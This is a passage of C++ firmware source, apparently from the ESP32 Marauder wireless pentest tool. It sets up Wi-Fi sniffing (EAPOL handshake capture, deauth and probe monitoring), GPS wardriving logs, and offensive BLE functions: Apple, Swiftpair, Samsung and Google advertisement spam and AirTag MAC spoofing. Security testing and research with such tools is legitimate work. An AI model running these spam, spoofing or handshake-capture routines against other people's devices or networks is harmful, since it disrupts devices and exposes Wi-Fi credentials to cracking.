  esp_wifi_set_promiscuous_rx_cb(&wifiSnifferCallback);
  esp_wifi_set_channel(set_channel, WIFI_SECOND_CHAN_NONE);
  this->wifi_initialized = true;
  uint32_t initTime = millis();
}

void WiFiScan::RunEapolScan(uint8_t scan_mode, uint16_t color)
{
  #ifdef MARAUDER_FLIPPER
    flipper_led.sniffLED();
  #elif defined(XIAO_ESP32_S3)
    xiao_led.sniffLED();
  #elif defined(MARAUDER_M5STICKC)
    stickc_led.sniffLED();
  #else
    led_obj.setMode(MODE_SNIFF);
  #endif
  
  num_eapol = 0;

  #ifdef HAS_ILI9341
    #ifdef HAS_SCREEN
      display_obj.tft.init();
      display_obj.tft.setRotation(1);
      display_obj.tft.fillScreen(TFT_BLACK);
    #endif
  
    startPcap("eapol");
  
    #ifdef HAS_SCREEN
      #ifdef TFT_SHIELD
        uint16_t calData[5] = { 391, 3491, 266, 3505, 7 }; // Landscape TFT Shield
        //Serial.println("Using TFT Shield");
      #else if defined(TFT_DIY)
        uint16_t calData[5] = { 213, 3469, 320, 3446, 1 }; // Landscape TFT DIY
        //Serial.println("Using TFT DIY");
      #endif
      display_obj.tft.setTouch(calData);
    
      display_obj.tft.setFreeFont(NULL);
      display_obj.tft.setTextSize(1);
      display_obj.tft.fillRect(127, 0, 193, 28, TFT_BLACK); // Buttons
      display_obj.tft.fillRect(12, 0, 90, 32, TFT_BLACK); // color key
    
      delay(10);
    
      display_obj.tftDrawGraphObjects(x_scale); //draw graph objects
      display_obj.tftDrawEapolColorKey();
      display_obj.tftDrawChannelScaleButtons(set_channel);
      display_obj.tftDrawExitScaleButtons();
    #endif
  #else
    startPcap("eapol");
    
    #ifdef HAS_SCREEN
      display_obj.TOP_FIXED_AREA_2 = 48;
      display_obj.tteBar = true;
      display_obj.print_delay_1 = 15;
      display_obj.print_delay_2 = 10;
      display_obj.initScrollValues(true);
      display_obj.tft.setTextWrap(false);
      display_obj.tft.setTextColor(TFT_WHITE, color);
      #ifdef HAS_FULL_SCREEN
        display_obj.tft.fillRect(0,16,240,16, color);
        display_obj.tft.drawCentreString(text_table4[38],120,16,2);
      #endif
      #ifdef HAS_ILI9341
        display_obj.touchToExit();
      #endif
      display_obj.tft.setTextColor(TFT_GREEN, TFT_BLACK);
      display_obj.setupScrollArea(display_obj.TOP_FIXED_AREA_2, BOT_FIXED_AREA);
    #endif
  #endif

  esp_wifi_init(&cfg);
  esp_wifi_set_storage(WIFI_STORAGE_RAM);
  esp_wifi_set_mode(WIFI_MODE_AP);

  esp_err_t err;
  wifi_config_t conf;
  err = esp_wifi_set_protocol(WIFI_IF_AP, WIFI_PROTOCOL_11B | WIFI_PROTOCOL_11G | WIFI_PROTOCOL_11N | WIFI_PROTOCOL_LR);
  if (err != 0)
  {
    Serial.print("could not set protocol : err=0x");
    Serial.println(err, HEX);
  }

  esp_wifi_get_config((wifi_interface_t)WIFI_IF_AP, &conf);
  conf.ap.ssid[0] = '\0';
  conf.ap.ssid_len = 0;
  conf.ap.channel = this->set_channel;
  conf.ap.ssid_hidden = 1;
  conf.ap.max_connection = 0;
  conf.ap.beacon_interval = 60000;

  err = esp_wifi_set_config((wifi_interface_t)WIFI_IF_AP, &conf);
  if (err != 0)
  {
    Serial.print("AP config set error, Maurauder SSID might visible : err=0x");
    Serial.println(err, HEX);
  }

  esp_wifi_start();
  esp_wifi_set_promiscuous(true);
  esp_wifi_set_promiscuous_filter(&filt);
  if (scan_mode == WIFI_SCAN_ACTIVE_EAPOL)
    esp_wifi_set_promiscuous_rx_cb(&activeEapolSnifferCallback);
  else if (scan_mode == WIFI_SCAN_ACTIVE_LIST_EAPOL)
    esp_wifi_set_promiscuous_rx_cb(&activeEapolSnifferCallback);
  else
    esp_wifi_set_promiscuous_rx_cb(&eapolSnifferCallback);
  esp_wifi_set_channel(set_channel, WIFI_SECOND_CHAN_NONE);
  this->wifi_initialized = true;
  initTime = millis();
}


// Function to prepare for beacon mimic
void WiFiScan::RunMimicFlood(uint8_t scan_mode, uint16_t color) {
  #ifdef HAS_SCREEN
    display_obj.TOP_FIXED_AREA_2 = 48;
    display_obj.tteBar = true;
    display_obj.print_delay_1 = 15;
    display_obj.print_delay_2 = 10;
    display_obj.initScrollValues(true);
    display_obj.tft.setTextWrap(false);
    display_obj.tft.setTextColor(TFT_BLACK, color);
    #ifdef HAS_FULL_SCREEN
      display_obj.tft.fillRect(0,16,240,16, color);
      display_obj.tft.drawCentreString(" Mimic Flood ",120,16,2);
    #endif
    #ifdef HAS_ILI9341
      display_obj.touchToExit();
    #endif
    display_obj.tft.setTextColor(TFT_GREEN, TFT_BLACK);
  #endif
  
  packets_sent = 0;
  esp_wifi_init(&cfg);
  esp_wifi_set_storage(WIFI_STORAGE_RAM);
  esp_wifi_set_mode(WIFI_AP_STA);
  esp_wifi_start();
  esp_wifi_set_promiscuous_filter(NULL);
  esp_wifi_set_promiscuous(true);
  esp_wifi_set_max_tx_power(78);
  this->wifi_initialized = true;
  initTime = millis();
}

void WiFiScan::RunPwnScan(uint8_t scan_mode, uint16_t color)
{
  startPcap("pwnagotchi");

  #ifdef MARAUDER_FLIPPER
    flipper_led.sniffLED();
  #elif defined(XIAO_ESP32_S3)
    xiao_led.sniffLED();
  #elif defined(MARAUDER_M5STICKC)
    stickc_led.sniffLED();
  #else
    led_obj.setMode(MODE_SNIFF);
  #endif

  #ifdef HAS_SCREEN
    display_obj.TOP_FIXED_AREA_2 = 48;
    display_obj.tteBar = true;
    display_obj.print_delay_1 = 15;
    display_obj.print_delay_2 = 10;
    display_obj.initScrollValues(true);
    display_obj.tft.setTextWrap(false);
    display_obj.tft.setTextColor(TFT_WHITE, color);
    #ifdef HAS_FULL_SCREEN
      display_obj.tft.fillRect(0,16,240,16, color);
      display_obj.tft.drawCentreString(text_table4[37],120,16,2);
    #endif
    #ifdef HAS_ILI9341
      display_obj.touchToExit();
    #endif
    display_obj.tft.setTextColor(TFT_GREEN, TFT_BLACK);
    display_obj.setupScrollArea(display_obj.TOP_FIXED_AREA_2, BOT_FIXED_AREA);
  #endif
  
  esp_wifi_init(&cfg);
  esp_wifi_set_storage(WIFI_STORAGE_RAM);
  esp_wifi_set_mode(WIFI_MODE_NULL);
  esp_wifi_start();
  esp_wifi_set_promiscuous(true);
  esp_wifi_set_promiscuous_filter(&filt);
  esp_wifi_set_promiscuous_rx_cb(&beaconSnifferCallback);
  esp_wifi_set_channel(set_channel, WIFI_SECOND_CHAN_NONE);
  this->wifi_initialized = true;
  initTime = millis();
}

void WiFiScan::executeSourApple() {
  #ifdef HAS_BT
    NimBLEDevice::init("");
    NimBLEServer *pServer = NimBLEDevice::createServer();

    pAdvertising = pServer->getAdvertising();

    delay(40);
    //NimBLEAdvertisementData advertisementData = getOAdvertisementData();
    NimBLEAdvertisementData advertisementData = this->GetUniversalAdvertisementData(Apple);
    pAdvertising->setAdvertisementData(advertisementData);
    pAdvertising->start();
    delay(20);
    pAdvertising->stop();
  #endif
}

/*void WiFiScan::generateRandomName(char *name, size_t length) {
    static const char alphabet[] = "abcdefghijklmnopqrstuvwxyz";
    
    // Generate the first character as uppercase
    name[0] = 'A' + (rand() % 26);
    
    // Generate the remaining characters as lowercase
    for (size_t i = 1; i < length - 1; ++i) {
        name[i] = alphabet[rand() % (sizeof(alphabet) - 1)];
    }
    name[length - 1] = '\0';  // Null-terminate the string
}*/

/*const char* WiFiScan::generateRandomName() {
  const char* charset = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ";
  int len = rand() % 10 + 1; // Generate a random length between 1 and 10
  char* randomName = (char*)malloc((len + 1) * sizeof(char)); // Allocate memory for the random name
  for (int i = 0; i < len; ++i) {
    randomName[i] = charset[rand() % strlen(charset)]; // Select random characters from the charset
  }
  randomName[len] = '\0'; // Null-terminate the string
  return randomName;
}*/

/*void WiFiScan::generateRandomMac(uint8_t* mac) {
  // Set the locally administered bit and unicast bit for the first byte
  mac[0] = 0x02; // The locally administered bit is the second least significant bit

  // Generate the rest of the MAC address
  for (int i = 1; i < 6; i++) {
    mac[i] = random(0, 255);
  }
}*/

void WiFiScan::setBaseMacAddress(uint8_t macAddr[6]) {
  // Use ESP-IDF function to set the base MAC address
  esp_err_t err = esp_base_mac_addr_set(macAddr);

  // Check for success or handle errors
  if (err == ESP_OK) {
    return;
  } else if (err == ESP_ERR_INVALID_ARG) {
    Serial.println("Error: Invalid MAC address argument.");
  } else {
    Serial.printf("Error: Failed to set MAC address. Code: %d\n", err);
  }
}

void WiFiScan::executeSpoofAirtag() {
  #ifdef HAS_BT
    for (int i = 0; i < airtags->size(); i++) {
      if (airtags->get(i).selected) {

        uint8_t macAddr[6];

        convertMacStringToUint8(airtags->get(i).mac, macAddr);

        macAddr[5] -= 2;

        // Do this because ESP32 BT addr is Base MAC + 2
        
        this->setBaseMacAddress(macAddr);

        NimBLEDevice::init("");

        NimBLEServer *pServer = NimBLEDevice::createServer();

        pAdvertising = pServer->getAdvertising();

        //NimBLEAdvertisementData advertisementData = getSwiftAdvertisementData();
        NimBLEAdvertisementData advertisementData = this->GetUniversalAdvertisementData(Airtag);
        pAdvertising->setAdvertisementData(advertisementData);
        pAdvertising->start();
        delay(10);
        pAdvertising->stop();

        NimBLEDevice::deinit();

        break;
      }
    }
  #endif
}

void WiFiScan::executeSwiftpairSpam(EBLEPayloadType type) {
  #ifdef HAS_BT
    uint8_t macAddr[6];
    generateRandomMac(macAddr);

    //esp_base_mac_addr_set(macAddr);

    this->setBaseMacAddress(macAddr);

    NimBLEDevice::init("");

    NimBLEServer *pServer = NimBLEDevice::createServer();

    pAdvertising = pServer->getAdvertising();

    //NimBLEAdvertisementData advertisementData = getSwiftAdvertisementData();
    NimBLEAdvertisementData advertisementData = this->GetUniversalAdvertisementData(type);
    pAdvertising->setAdvertisementData(advertisementData);
    pAdvertising->start();
    delay(10);
    pAdvertising->stop();

    NimBLEDevice::deinit();
  #endif
}

void WiFiScan::executeWarDrive() {
  #ifdef HAS_GPS
    if (gps_obj.getGpsModuleStatus()) {
      bool do_save;
      String display_string;
      
      while (WiFi.scanComplete() == WIFI_SCAN_RUNNING) {
        Serial.println("Scan running...");
        delay(500);
      }
      
      int n = WiFi.scanNetworks(false, true, false, 110, this->set_channel);

      if (n > 0) {
        for (int i = 0; i < n; i++) {
          display_string = "";
          do_save = false;
          uint8_t *this_bssid_raw = WiFi.BSSID(i);
          char this_bssid[18] = {0};
          sprintf(this_bssid, "%02X:%02X:%02X:%02X:%02X:%02X", this_bssid_raw[0], this_bssid_raw[1], this_bssid_raw[2], this_bssid_raw[3], this_bssid_raw[4], this_bssid_raw[5]);

          if (this->seen_mac(this_bssid_raw))
            continue;

          this->save_mac(this_bssid_raw);

          String ssid = WiFi.SSID(i);
          ssid.replace(",","_");

          if (ssid != "") {
            display_string.concat(ssid);
          }
          else {
            display_string.concat(this_bssid);
          }

          if (gps_obj.getFixStatus()) {
            do_save = true;
            display_string.concat(" | Lt: " + gps_obj.getLat());
            display_string.concat(" | Ln: " + gps_obj.getLon());
          }
          else {
            display_string.concat(" | GPS: No Fix");
          }

          int temp_len = display_string.length();

          #ifdef HAS_SCREEN
            for (int i = 0; i < 40 - temp_len; i++)
            {
              display_string.concat(" ");
            }
            
            display_obj.display_buffer->add(display_string);
          #endif


          String wardrive_line = WiFi.BSSIDstr(i) + "," + ssid + "," + this->security_int_to_string(WiFi.encryptionType(i)) + "," + gps_obj.getDatetime() + "," + (String)WiFi.channel(i) + "," + (String)WiFi.RSSI(i) + "," + gps_obj.getLat() + "," + gps_obj.getLon() + "," + gps_obj.getAlt() + "," + gps_obj.getAccuracy() + ",WIFI\n";
          Serial.print((String)this->mac_history_cursor + " | " + wardrive_line);

          if (do_save) {
            buffer_obj.append(wardrive_line);
          }
        }
      }
      this->channelHop();

      // Free up that memory, you sexy devil
      WiFi.scanDelete();
    }
  #endif
}

// Function to start running a beacon scan
void WiFiScan::RunBeaconScan(uint8_t scan_mode, uint16_t color)
{
  if (scan_mode == WIFI_SCAN_AP)
    startPcap("beacon");
  else if (scan_mode == WIFI_SCAN_WAR_DRIVE) {
    #ifdef HAS_GPS
      if (gps_obj.getGpsModuleStatus()) {
        startLog("wardrive");
        String header_line = "WigleWifi-1.4,appRelease=" + (String)MARAUDER_VERSION + ",model=ESP32 Marauder,release=" + (String)MARAUDER_VERSION + ",device=ESP32 Marauder,display=SPI TFT,board=ESP32 Marauder,brand=JustCallMeKoko\nMAC,SSID,AuthMode,FirstSeen,Channel,RSSI,CurrentLatitude,CurrentLongitude,AltitudeMeters,AccuracyMeters,Type\n";
        buffer_obj.append(header_line);
      } else {
        return;
      }
    #else
      return;
    #endif
  }

  #ifdef MARAUDER_FLIPPER
    flipper_led.sniffLED();
  #elif defined(XIAO_ESP32_S3)
    xiao_led.sniffLED();
  #elif defined(MARAUDER_M5STICKC)
    stickc_led.sniffLED();
  #else
    led_obj.setMode(MODE_SNIFF);
  #endif
  
  #ifdef HAS_SCREEN
    display_obj.TOP_FIXED_AREA_2 = 48;
    display_obj.tteBar = true;
    display_obj.print_delay_1 = 15;
    display_obj.print_delay_2 = 10;
    display_obj.initScrollValues(true);
    display_obj.tft.setTextWrap(false);
    display_obj.tft.setTextColor(TFT_WHITE, color);
    #ifdef HAS_FULL_SCREEN
      display_obj.tft.fillRect(0,16,240,16, color);
      if (scan_mode == WIFI_SCAN_AP)
        display_obj.tft.drawCentreString(text_table4[38],120,16,2);
      else if (scan_mode == WIFI_SCAN_WAR_DRIVE) {
        this->clearMacHistory();
        display_obj.tft.drawCentreString("Wardrive", 120, 16, 2);
      }
      #ifdef HAS_ILI9341
        display_obj.touchToExit();
      #endif
    #endif
    display_obj.tft.setTextColor(TFT_GREEN, TFT_BLACK);
    display_obj.setupScrollArea(display_obj.TOP_FIXED_AREA_2, BOT_FIXED_AREA);
  #endif

  if (scan_mode != WIFI_SCAN_WAR_DRIVE) {
  
    esp_wifi_init(&cfg);
    esp_wifi_set_storage(WIFI_STORAGE_RAM);
    esp_wifi_set_mode(WIFI_MODE_NULL);
    esp_wifi_start();
    esp_wifi_set_promiscuous(true);
    esp_wifi_set_promiscuous_filter(&filt);
    esp_wifi_set_promiscuous_rx_cb(&beaconSnifferCallback);
    esp_wifi_set_channel(set_channel, WIFI_SECOND_CHAN_NONE);
  }
  else {
    this->startWardriverWiFi();
  }
  this->wifi_initialized = true;
  initTime = millis();
}

void WiFiScan::startWardriverWiFi() {
  WiFi.mode(WIFI_STA);
  WiFi.disconnect();
}

void WiFiScan::RunStationScan(uint8_t scan_mode, uint16_t color)
{
  startPcap("station");

  #ifdef MARAUDER_FLIPPER
    flipper_led.sniffLED();
  #elif defined(XIAO_ESP32_S3)
    xiao_led.sniffLED();
  #elif defined(MARAUDER_M5STICKC)
    stickc_led.sniffLED();
  #else
    led_obj.setMode(MODE_SNIFF);
  #endif
  
  #ifdef HAS_SCREEN
    display_obj.TOP_FIXED_AREA_2 = 48;
    display_obj.tteBar = true;
    display_obj.print_delay_1 = 15;
    display_obj.print_delay_2 = 10;
    display_obj.initScrollValues(true);
    display_obj.tft.setTextWrap(false);
    display_obj.tft.setTextColor(TFT_WHITE, color);
    #ifdef HAS_FULL_SCREEN
      display_obj.tft.fillRect(0,16,240,16, color);
      display_obj.tft.drawCentreString(text_table1[59],120,16,2);
    #endif
    #ifdef HAS_ILI9341
      display_obj.touchToExit();
    #endif
    display_obj.tft.setTextColor(TFT_GREEN, TFT_BLACK);
    display_obj.setupScrollArea(display_obj.TOP_FIXED_AREA_2, BOT_FIXED_AREA);
  #endif
  
  esp_wifi_init(&cfg);
  esp_wifi_set_storage(WIFI_STORAGE_RAM);
  esp_wifi_set_mode(WIFI_MODE_NULL);
  esp_wifi_start();
  esp_wifi_set_promiscuous(true);
  esp_wifi_set_promiscuous_filter(&filt);
  esp_wifi_set_promiscuous_rx_cb(&stationSnifferCallback);
  esp_wifi_set_channel(set_channel, WIFI_SECOND_CHAN_NONE);
  this->wifi_initialized = true;
  initTime = millis();
}

void WiFiScan::RunRawScan(uint8_t scan_mode, uint16_t color)
{
  if (scan_mode != WIFI_SCAN_SIG_STREN)
    startPcap("raw");

  #ifdef MARAUDER_FLIPPER
    flipper_led.sniffLED();
  #elif defined(XIAO_ESP32_S3)
    xiao_led.sniffLED();
  #elif defined(MARAUDER_M5STICKC)
    stickc_led.sniffLED();
  #else
    led_obj.setMode(MODE_SNIFF);
  #endif
  
  #ifdef HAS_SCREEN
    display_obj.TOP_FIXED_AREA_2 = 48;
    display_obj.tteBar = true;
    display_obj.print_delay_1 = 15;
    display_obj.print_delay_2 = 10;
    display_obj.initScrollValues(true);
    display_obj.tft.setTextWrap(false);
    display_obj.tft.setTextColor(TFT_WHITE, color);
    #ifdef HAS_FULL_SCREEN
      display_obj.tft.fillRect(0,16,240,16, color);
      if (scan_mode != WIFI_SCAN_SIG_STREN)
        display_obj.tft.drawCentreString(text_table1[58],120,16,2);
      else
        display_obj.tft.drawCentreString("Signal Monitor", 120, 16, 2);
      #ifdef HAS_ILI9341
        display_obj.touchToExit();
      #endif
    #endif
    display_obj.tft.setTextColor(TFT_GREEN, TFT_BLACK);
    display_obj.setupScrollArea(display_obj.TOP_FIXED_AREA_2, BOT_FIXED_AREA);
  #endif
  
  esp_wifi_init(&cfg);
  esp_wifi_set_storage(WIFI_STORAGE_RAM);
  esp_wifi_set_mode(WIFI_MODE_NULL);
  esp_wifi_start();
  esp_wifi_set_promiscuous(true);
  esp_wifi_set_promiscuous_filter(&filt);
  esp_wifi_set_promiscuous_rx_cb(&rawSnifferCallback);
  esp_wifi_set_channel(set_channel, WIFI_SECOND_CHAN_NONE);
  this->wifi_initialized = true;
  initTime = millis();
}

void WiFiScan::RunDeauthScan(uint8_t scan_mode, uint16_t color)
{
  startPcap("deauth");

  #ifdef MARAUDER_FLIPPER
    flipper_led.sniffLED();
  #elif defined(XIAO_ESP32_S3)
    xiao_led.sniffLED();
  #elif defined(MARAUDER_M5STICKC)
    stickc_led.sniffLED();
  #else
    led_obj.setMode(MODE_SNIFF);
  #endif
  
  #ifdef HAS_SCREEN
    display_obj.TOP_FIXED_AREA_2 = 48;
    display_obj.tteBar = true;
    display_obj.print_delay_1 = 15;
    display_obj.print_delay_2 = 10;
    display_obj.initScrollValues(true);
    display_obj.tft.setTextWrap(false);
    display_obj.tft.setTextColor(TFT_BLACK, color);
    #ifdef HAS_FULL_SCREEN
      display_obj.tft.fillRect(0,16,240,16, color);
      display_obj.tft.drawCentreString(text_table4[39],120,16,2);
    #endif
    #ifdef HAS_ILI9341
      display_obj.touchToExit();
    #endif
    display_obj.tft.setTextColor(TFT_RED, TFT_BLACK);
    display_obj.setupScrollArea(display_obj.TOP_FIXED_AREA_2, BOT_FIXED_AREA);
  #endif
  
  esp_wifi_init(&cfg);
  esp_wifi_set_storage(WIFI_STORAGE_RAM);
  esp_wifi_set_mode(WIFI_MODE_NULL);
  esp_wifi_start();
  esp_wifi_set_promiscuous(true);
  esp_wifi_set_promiscuous_filter(&filt);
  esp_wifi_set_promiscuous_rx_cb(&deauthSnifferCallback);
  esp_wifi_set_channel(set_channel, WIFI_SECOND_CHAN_NONE);
  this->wifi_initialized = true;
  initTime = millis();
}


// Function for running probe request scan
void WiFiScan::RunProbeScan(uint8_t scan_mode, uint16_t color)
{
  if (scan_mode == WIFI_SCAN_PROBE)
    startPcap("probe");
  else if (scan_mode == WIFI_SCAN_STATION_WAR_DRIVE) {
    #ifdef HAS_GPS
      if (gps_obj.getGpsModuleStatus()) {
        startLog("station_wardrive");
        String header_line = "WigleWifi-1.4,appRelease=" + (String)MARAUDER_VERSION + ",model=ESP32 Marauder,release=" + (String)MARAUDER_VERSION + ",device=ESP32 Marauder,display=SPI TFT,board=ESP32 Marauder,brand=JustCallMeKoko\nMAC,SSID,AuthMode,FirstSeen,Channel,RSSI,CurrentLatitude,CurrentLongitude,AltitudeMeters,AccuracyMeters,Type\n";
        buffer_obj.append(header_line);
      } else {
        return;
      }
    #else
      return;
    #endif
  }

  #ifdef MARAUDER_FLIPPER
    flipper_led.sniffLED();
  #elif defined(XIAO_ESP32_S3)
    xiao_led.sniffLED();
  #elif defined(MARAUDER_M5STICKC)
    stickc_led.sniffLED();
  #else
    led_obj.setMode(MODE_SNIFF);
  #endif
  
  #ifdef HAS_SCREEN
    display_obj.TOP_FIXED_AREA_2 = 48;
    display_obj.tteBar = true;
    display_obj.print_delay_1 = 15;
    display_obj.print_delay_2 = 10;
    display_obj.initScrollValues(true);
    display_obj.tft.setTextWrap(false);
    display_obj.tft.setTextColor(TFT_BLACK, color);
    #ifdef HAS_FULL_SCREEN
      display_obj.tft.fillRect(0,16,240,16, color);
      display_obj.tft.drawCentreString(text_table4[40],120,16,2);
    #endif
    #ifdef HAS_ILI9341
      display_obj.touchToExit();
    #endif
    display_obj.tft.setTextColor(TFT_GREEN, TFT_BLACK);
    display_obj.setupScrollArea(display_obj.TOP_FIXED_AREA_2, BOT_FIXED_AREA);
  #endif
  
  esp_wifi_init(&cfg);
  esp_wifi_set_storage(WIFI_STORAGE_RAM);
  esp_wifi_set_mode(WIFI_MODE_NULL);
  esp_wifi_start();
  esp_wifi_set_promiscuous(true);
  esp_wifi_set_promiscuous_filter(&filt);
  esp_wifi_set_promiscuous_rx_cb(&probeSnifferCallback);
  esp_wifi_set_channel(set_channel, WIFI_SECOND_CHAN_NONE);
  this->wifi_initialized = true;
  initTime = millis();
}

void WiFiScan::RunSourApple(uint8_t scan_mode, uint16_t color) {
  #ifdef HAS_BT
    /*NimBLEDevice::init("");
    NimBLEServer *pServer = NimBLEDevice::createServer();

    pAdvertising = pServer->getAdvertising();*/

    #ifdef HAS_SCREEN
      display_obj.TOP_FIXED_AREA_2 = 48;
      display_obj.tteBar = true;
      display_obj.print_delay_1 = 15;
      display_obj.print_delay_2 = 10;
      display_obj.initScrollValues(true);
      display_obj.tft.setTextWrap(false);
      display_obj.tft.setTextColor(TFT_BLACK, color);
      #ifdef HAS_FULL_SCREEN
        display_obj.tft.fillRect(0,16,240,16, color);
        display_obj.tft.drawCentreString("Sour Apple",120,16,2);
      #endif
      #ifdef HAS_ILI9341
        display_obj.touchToExit();
      #endif
      display_obj.tft.setTextColor(TFT_GREEN, TFT_BLACK);
    #endif

    this->ble_initialized;

    #ifdef MARAUDER_FLIPPER
      flipper_led.sniffLED();
    #elif defined(XIAO_ESP32_S3)
      xiao_led.sniffLED();
    #elif defined(MARAUDER_M5STICKC)
      stickc_led.sniffLED();
    #else
      led_obj.setMode(MODE_SNIFF);
    #endif

  #endif
}

void WiFiScan::RunSwiftpairSpam(uint8_t scan_mode, uint16_t color) {
  #ifdef HAS_BT
    #ifdef HAS_SCREEN
      display_obj.TOP_FIXED_AREA_2 = 48;
      display_obj.tteBar = true;
      display_obj.print_delay_1 = 15;
      display_obj.print_delay_2 = 10;
      display_obj.initScrollValues(true);
      display_obj.tft.setTextWrap(false);
      display_obj.tft.setTextColor(TFT_BLACK, color);
      #ifdef HAS_FULL_SCREEN
        display_obj.tft.fillRect(0,16,240,16, color);
        if (scan_mode == BT_ATTACK_SWIFTPAIR_SPAM)
          display_obj.tft.drawCentreString("Swiftpair Spam",120,16,2);
        else if (scan_mode == BT_ATTACK_SPAM_ALL)
          display_obj.tft.drawCentreString("BLE Spam All",120,16,2);
        else if (scan_mode == BT_ATTACK_SAMSUNG_SPAM)
          display_obj.tft.drawCentreString("BLE Spam Samsung",120,16,2);
        else if (scan_mode == BT_ATTACK_GOOGLE_SPAM)
          display_obj.tft.drawCentreString("BLE Spam Google",120,16,2);
        else if (scan_mode == BT_ATTACK_FLIPPER_SPAM)
          display_obj.tft.drawCentreString("BLE Spam Flipper", 120, 16, 2);
        else if (scan_mode == BT_SPOOF_AIRTAG)
          display_obj.tft.drawCentreString("BLE Spoof Airtag", 120, 16, 2);
        #ifdef HAS_ILI9341
          display_obj.touchToExit();
        #endif
      #endif
      display_obj.tft.setTextColor(TFT_GREEN, TFT_BLACK);
    #endif

    this->ble_initialized;

    #ifdef MARAUDER_FLIPPER
      flipper_led.attackLED();
    #elif defined(XIAO_ESP32_S3)
      xiao_led.attackLED();
    #elif defined(MARAUDER_M5STICKC)
      stickc_led.attackLED();
    #else
      led_obj.setMode(MODE_ATTACK);
    #endif
  #endif
}

// Function to start running any BLE scan
void WiFiScan::RunBluetoothScan(uint8_t scan_mode, uint16_t color)
{
  #ifdef HAS_BT
    #ifdef HAS_SCREEN
      display_obj.print_delay_1 = 50;
      display_obj.print_delay_2 = 20;
    #endif
  
    if (scan_mode != BT_SCAN_WAR_DRIVE_CONT) {
      NimBLEDevice::setScanFilterMode(CONFIG_BTDM_SCAN_DUPL_TYPE_DEVICE);
      NimBLEDevice::setScanDuplicateCacheSize(200);
    }
    NimBLEDevice::init("");
    pBLEScan = NimBLEDevice::getScan(); //create new scan
    if ((scan_mode == BT_SCAN_ALL) || (scan_mode == BT_SCAN_AIRTAG) || (scan_mode == BT_SCAN_FLIPPER))
    {
      #ifdef HAS_SCREEN
        display_obj.TOP_FIXED_AREA_2 = 48;
        display_obj.tteBar = true;
        display_obj.initScrollValues(true);
        display_obj.tft.setTextWrap(false);
        display_obj.tft.setTextColor(TFT_BLACK, color);
        #ifdef HAS_FULL_SCREEN
          display_obj.tft.fillRect(0,16,240,16, color);
          if (scan_mode == BT_SCAN_ALL)
            display_obj.tft.drawCentreString(text_table4[41],120,16,2);
          else if (scan_mode == BT_SCAN_AIRTAG)
            display_obj.tft.drawCentreString("Airtag Sniff",120,16,2);
          else if (scan_mode == BT_SCAN_FLIPPER)
            display_obj.tft.drawCentreString("Flipper Sniff", 120, 16, 2);
          #ifdef HAS_ILI9341
            display_obj.touchToExit();
          #endif
        #endif
        display_obj.tft.setTextColor(TFT_CYAN, TFT_BLACK);
        display_obj.setupScrollArea(display_obj.TOP_FIXED_AREA_2, BOT_FIXED_AREA);
      #endif
      if (scan_mode == BT_SCAN_ALL)
        pBLEScan->setAdvertisedDeviceCallbacks(new bluetoothScanAllCallback(), false);
      else if (scan_mode == BT_SCAN_AIRTAG) {
        this->clearAirtags();
        pBLEScan->setAdvertisedDeviceCallbacks(new bluetoothScanAllCallback(), true);
      }
      else if (scan_mode == BT_SCAN_FLIPPER) {
        this->clearFlippers();
        pBLEScan->setAdvertisedDeviceCallbacks(new bluetoothScanAllCallback(), true);
      }
    }
    else if ((scan_mode == BT_SCAN_WAR_DRIVE) || (scan_mode == BT_SCAN_WAR_DRIVE_CONT)) {
      #ifdef HAS_GPS
        if (gps_obj.getGpsModuleStatus()) {
          if (scan_mode == BT_SCAN_WAR_DRIVE) {
            startLog("bt_wardrive");
          }
          else if (scan_mode == BT_SCAN_WAR_DRIVE_CONT) {
            startLog("bt_wardrive_cont");
          }
          String header_line = "WigleWifi-1.4,appRelease=" + (String)MARAUDER_VERSION + ",model=ESP32 Marauder,release=" + (String)MARAUDER_VERSION + ",device=ESP32 Marauder,display=SPI TFT,board=ESP32 Marauder,brand=JustCallMeKoko\nMAC,SSID,AuthMode,FirstSeen,Channel,RSSI,CurrentLatitude,CurrentLongitude,AltitudeMeters,AccuracyMeters,Type\n";
          buffer_obj.append(header_line);
        } else {
          return;
        }
      #else
        return;
      #endif
      #ifdef HAS_SCREEN
        display_obj.TOP_FIXED_AREA_2 = 48;
        display_obj.tteBar = true;
        display_obj.initScrollValues(true);
        display_obj.tft.setTextWrap(false);
        display_obj.tft.setTextColor(TFT_BLACK, color);
        #ifdef HAS_FULL_SCREEN
          display_obj.tft.fillRect(0,16,240,16, color);
          if (scan_mode == BT_SCAN_WAR_DRIVE)
            display_obj.tft.drawCentreString("BT Wardrive",120,16,2);
          else if (scan_mode == BT_SCAN_WAR_DRIVE_CONT)
            display_obj.tft.drawCentreString("BT Wardrive Continuous",120,16,2);
          #ifdef HAS_ILI9341
            display_obj.touchToExit();
          #endif
        #endif
        display_obj.tft.setTextColor(TFT_CYAN, TFT_BLACK);
        display_obj.setupScrollArea(display_obj.TOP_FIXED_AREA_2, BOT_FIXED_AREA);
      #endif
      if (scan_mode != BT_SCAN_WAR_DRIVE_CONT)
        pBLEScan->setAdvertisedDeviceCallbacks(new bluetoothScanAllCallback(), false);
      else
        pBLEScan->setAdvertisedDeviceCallbacks(new bluetoothScanAllCallback(), true);
    }
    else if (scan_mode == BT_SCAN_SKIMMERS)
    {
      #ifdef HAS_SCREEN
        display_obj.TOP_FIXED_AREA_2 = 160;
        display_obj.tteBar = true;
        display_obj.tft.fillScreen(TFT_DARKGREY);
        display_obj.initScrollValues(true);
        display_obj.tft.setTextWrap(false);
        display_obj.tft.setTextColor(TFT_BLACK, color);
        display_obj.tft.fillRect(0,16,240,16, color);
        display_obj.tft.drawCentreString(text_table4[42],120,16,2);
        display_obj.twoPartDisplay(text_table4[43]);
        display_obj.tft.setTextColor(TFT_BLACK, TFT_DARKGREY);
        display_obj.setupScrollArea(display_obj.TOP_FIXED_AREA_2, BOT_FIXED_AREA);
      #endif
      pBLEScan->setAdvertisedDeviceCallbacks(new bluetoothScanSkimmersCallback(), false);
    }
    pBLEScan->setActiveScan(true); //active scan uses more power, but get results faster
    pBLEScan->setInterval(100);
    pBLEScan->setWindow(99);  // less or equal setInterval value
    pBLEScan->setMaxResults(0);
    pBLEScan->start(0, scanCompleteCB, false);
    Serial.println("Started BLE Scan");
    this->ble_initialized = true;

    #ifdef MARAUDER_FLIPPER
      flipper_led.sniffLED();
    #elif defined(XIAO_ESP32_S3)
      xiao_led.sniffLED();
    #elif defined(MARAUDER_M5STICKC)
      stickc_led.sniffLED();
    #else
      led_obj.setMode(MODE_SNIFF);
    #endif

    initTime = millis();
